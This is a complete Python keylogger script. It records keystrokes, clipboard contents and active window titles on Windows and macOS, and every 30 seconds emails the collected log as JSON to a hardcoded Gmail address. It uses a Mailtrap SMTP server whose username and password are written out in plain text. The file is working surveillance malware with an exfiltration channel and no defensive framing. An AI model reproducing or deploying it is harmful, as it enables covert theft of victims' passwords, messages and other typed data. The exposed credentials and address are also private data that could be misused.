import threading
import time
import subprocess
import platform
import smtplib
from pynput.keyboard import Listener
import pyperclip
from email.message import EmailMessage
import json

# Lists to store captured data
keystrokes = []
clipboard_data = []
active_window_info = []
last_clipboard = ""
last_window = None  # Track the last active window

# Function to get active window on macOS
def get_active_window_mac():
    try:
        result = subprocess.run(
            ["osascript", "-e", 'tell application "System Events" to get name of (processes where frontmost is true)'],
            capture_output=True, text=True
        )
        return result.stdout.strip()
    except Exception as e:
        return f"Error getting active window: {e}"

# Function to get active window on Windows
def get_active_window_windows():
    try:
        import win32gui
        window = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(window)
    except Exception as e:
        return f"Error getting active window: {e}"

# Main function to get active window based on OS
def get_active_window():
    if platform.system() == "Windows":
        return get_active_window_windows()
    elif platform.system() == "Darwin":  # macOS
        return get_active_window_mac()
    else:
        return "Unsupported OS"

# Function to log active window only when it changes
def log_active_window():
    global last_window, active_window_info
    active_window = get_active_window()
    if active_window != last_window:
        last_window = active_window
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        active_window_info.append({"timestamp": timestamp, "window": active_window})

# Function to capture keystrokes
def on_press(key):
    global keystrokes
    try:
        keystrokes.append(f"{key.char}")
    except AttributeError:
        keystrokes.append(f"{key}")

    # Log the active window only when it changes
    log_active_window()

# Function to capture clipboard content
def log_clipboard():
    global clipboard_data, last_clipboard
    try:
        clipboard_content = pyperclip.paste()
        if clipboard_content and clipboard_content.strip() != "" and clipboard_content != last_clipboard:
            clipboard_data.append(clipboard_content)
            last_clipboard = clipboard_content

            # Log the active window only when it changes
            log_active_window()
    except Exception as e:
        print(f"Clipboard logging error: {e}")


def send_email(log_data):
    sender_email = "hello@demomailtrap.com"
    receiver_email = "geniusmyra@gmail.com"
    message = EmailMessage()
    message.set_content(log_data)
    message['Subject'] = 'Keylogger Data'
    message['From'] = sender_email
    message['To'] = receiver_email

    smtp_server = "live.smtp.mailtrap.io"
    smtp_port = 587
    smtp_username = "api"
    smtp_password = "135c408123864db529258d292639635a"

    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(smtp_username, smtp_password)
            server.send_message(message)
            print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")

def compile_log_data():
    global keystrokes, clipboard_data, active_window_info
    if not keystrokes and not clipboard_data and not active_window_info:
        print("No data to compile.")  # Debug output
    log_data = json.dumps({
        "keystrokes": keystrokes,
        "clipboard": clipboard_data,
        "active_windows": active_window_info,
        "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')
    }, indent=4)
    return log_data

def email_sending_loop():
    while True:
        log_data = compile_log_data()
        if log_data:
            send_email(log_data)
        time.sleep(30)  # Adjust as necessary for your testing
        # keystrokes.clear()
        # clipboard_data.clear()
        # active_window_info.clear()

def monitor_clipboard():
    while True:
        log_clipboard()
        time.sleep(5)

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

# Set up threading for clipboard monitoring, keylogging, and email sending
keylogger_thread = threading.Thread(target=start_keylogger)
clipboard_thread = threading.Thread(target=monitor_clipboard)
email_thread = threading.Thread(target=email_sending_loop)

keylogger_thread.start()
clipboard_thread.start()
email_thread.start()
